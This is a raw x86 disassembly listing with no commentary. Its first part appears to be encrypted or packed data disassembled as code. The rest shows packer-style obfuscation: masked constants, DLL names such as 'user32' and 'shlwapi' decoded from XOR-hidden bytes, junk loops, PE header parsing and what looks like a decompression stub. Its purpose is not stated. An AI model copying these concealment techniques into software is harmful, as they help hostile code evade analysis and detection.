  423c9f:	adc    bh,ah
  423ca1:	fsubr  DWORD PTR [edi+0xa]
  423ca4:	pop    esi
  423ca5:	out    0xf,al
  423ca7:	shl    BYTE PTR [ecx-0x3d],0x7d
  423cab:	mov    ds:0xed5947df,eax
  423cb0:	or     dl,ah
  423cb2:	and    BYTE PTR [ecx],dh
  423cb4:	inc    edx
  423cb5:	gs inc esi
  423cb7:	adc    eax,DWORD PTR [ecx+0x4b087472]
  423cbd:	push   ebx
  423cbe:	push   ebp
  423cc0:	test   esi,esi
  423cc2:	jg     0x423cfd
  423cc4:	gs stos DWORD PTR es:[edi],eax
  423cc6:	xor    DWORD PTR [edi],ebp
  423cc8:	retf   
  423cc9:	lods   eax,DWORD PTR ds:[esi]
  423cca:	or     al,0x29
  423ccc:	mov    ecx,0x9b5fa729
  423cd1:	hlt    
  423cd2:	adc    DWORD PTR [esi],0xffffffe9
  423cd5:	mov    edx,0x9a27ce1e
  423cda:	cdq    
  423cdb:	inc    esi
  423cdc:	stc    
  423cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cde:	xchg   ecx,eax
  423cdf:	jl     0x423cf5
  423ce1:	idiv   DWORD PTR ds:0x7999d565
  423ce7:	imul   ebp,DWORD PTR [ebp-0x40],0x96e67c8
  423cee:	mov    ah,0x10
  423cf0:	hlt    
  423cf1:	or     BYTE PTR [edi],dh
  423cf3:	repz and BYTE PTR [esp+ecx*4],ch
  423cf7:	pop    DWORD PTR [edi+0x74f8d7cf]
  423cfd:	shr    DWORD PTR [esi-0x37],cl
  423d00:	hlt    
  423d01:	adc    DWORD PTR [ebp-0x43],edx
  423d04:	mov    bh,0xf9
  423d06:	and    BYTE PTR [ebx+edi*4-0x2b],0x80
  423d0b:	sbb    DWORD PTR [ebp+0x56],edi
  423d0e:	cmp    BYTE PTR [edx-0x5bf9efb2],al
  423d14:	push   ds
  423d15:	pusha  
  423d16:	(bad)  
  423d17:	inc    esi
  423d18:	dec    esi
  423d19:	in     al,dx
  423d1a:	shl    esp,0x8a
  423d1d:	mov    cl,0xd5
  423d1f:	mov    cl,BYTE PTR [edi]
  423d21:	mov    ds:0x79ad3fc1,al
  423d26:	ret    0x7133
  423d29:	pop    ds
  423d2a:	aad    0xa1
  423d2c:	dec    ebp
  423d2d:	in     al,0x21
  423d2f:	and    DWORD PTR ds:0xc79881b1,edi
  423d35:	nop
  423d36:	out    dx,eax
  423d37:	inc    ebp
  423d38:	stos   DWORD PTR es:[edi],eax
  423d39:	pop    ebx
  423d3a:	pop    eax
  423d3b:	ins    BYTE PTR es:[edi],dx
  423d3c:	jo     0x423da2
  423d3e:	jl     0x423d2c
  423d40:	adc    BYTE PTR [eax+ecx*4-0x26],ch
  423d44:	mov    al,ds:0x7dd3b8a4
  423d49:	xlat   BYTE PTR ds:[ebx]
  423d4a:	lahf   
  423d4b:	push   ss
  423d4c:	cmp    esi,DWORD PTR [esp+edx*1]
  423d4f:	or     al,0xe8
  423d51:	out    dx,al
  423d52:	fcmovb st,st(0)
  423d54:	adc    eax,0xfc292aee
  423d59:	jle    0x423d8a
  423d5b:	es ins BYTE PTR es:[edi],dx
  423d5d:	loop   0x423dcc
  423d5f:	mov    WORD PTR [edi+eax*2-0x68],gs
  423d63:	add    eax,0x88f8569e
  423d68:	xchg   esi,eax
  423d69:	xchg   ebp,eax
  423d6a:	adc    dh,ch
  423d6c:	cli    
  423d6d:	pop    ebp
  423d6e:	in     eax,dx
  423d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d70:	out    0x2d,eax
  423d72:	out    dx,al
  423d73:	push   ecx
  423d74:	mov    bl,0x38
  423d76:	rcl    BYTE PTR [esi],1
  423d78:	fst    QWORD PTR [edx]
  423d7a:	cmp    BYTE PTR [edi],cl
  423d7c:	sbb    esp,ecx
  423d7e:	cld    
  423d7f:	loopne 0x423d94
  423d81:	xchg   edx,eax
  423d82:	ss imul ebx,ebx,0x7b
  423d86:	xchg   ebp,eax
  423d87:	sbb    ch,BYTE PTR [eax+0x66]
  423d8a:	in     al,dx
  423d8b:	sub    al,0xec
  423d8d:	inc    ebx
  423d8e:	imul   eax,DWORD PTR [ebx],0xffffffcc
  423d91:	mov    WORD PTR [ecx],es
  423d93:	push   eax
  423d94:	jnp    0x423d89
  423d96:	jae    0x423d39
  423d98:	xsave  [bp+si-0x49]
  423d9d:	mov    DWORD PTR [ebx-0x64097716],esi
  423da3:	fs fwait
  423da5:	dec    esi
  423da6:	fbstp  TBYTE PTR [ecx+ecx*2-0x1]
  423daa:	les    esi,FWORD PTR ds:0xca04e923
  423db0:	pop    ss
  423db1:	mov    ds:0x446124a5,al
  423db6:	mov    esi,0x1d3d1d6e
  423dbb:	clc    
  423dbc:	aas    
  423dbd:	or     cl,BYTE PTR [ebp+0x3a066f7f]
  423dc3:	ins    BYTE PTR es:[edi],dx
  423dc4:	dec    ebx
  423dc5:	repz jle 0x423d51
  423dc8:	jecxz  0x423dec
  423dca:	fstp   DWORD PTR [ebp+0x56]
  423dcd:	sub    dh,BYTE PTR [eax+0x2]
  423dd0:	pop    esi
  423dd1:	fiadd  DWORD PTR [edx-0x660a3e52]
  423dd7:	xchg   ebx,eax
  423dd8:	jbe    0x423e0a
  423dda:	dec    ebx
  423ddb:	rcl    DWORD PTR ds:0x2456daef,0xd1
  423de2:	ja     0x423da6
  423de4:	pop    ebp
  423de5:	push   ds
  423de6:	dec    ebp
  423de7:	jno    0x423e18
  423de9:	fdivr  DWORD PTR [ebx]
  423deb:	pop    eax
  423dec:	pop    esp
  423ded:	xchg   ebx,eax
  423dee:	(bad)  
  423def:	push   edx
  423df0:	cmp    al,0x9a
  423df2:	inc    eax
  423df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423df4:	loop   0x423d7c
  423df6:	adc    BYTE PTR [eax+eiz*1-0x6f],ah
  423dfa:	pop    esi
  423dfb:	sbb    edi,DWORD PTR [eax+0x72690f7f]
  423e01:	enter  0x458b,0x8
  423e05:	movsx  eax,BYTE PTR [eax]
  423e08:	mov    edx,0x3272f6
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42aa1b
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42aa1f
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429727
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	rcr    DWORD PTR [eax-0x35],0xc7
  424068:	nop
  424069:	jge    0x424054
  42406b:	inc    esp
  42406c:	stos   BYTE PTR es:[edi],al
  42406d:	dec    edi
  42406e:	adc    al,0x54
  424070:	mov    ds:0x146d87e,eax
  424075:	add    BYTE PTR [eax],al
  424077:	add    BYTE PTR [ebx+0x3a],al
  42407a:	pop    esp
  42407b:	inc    esi
  42407c:	outs   dx,DWORD PTR ds:[esi]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
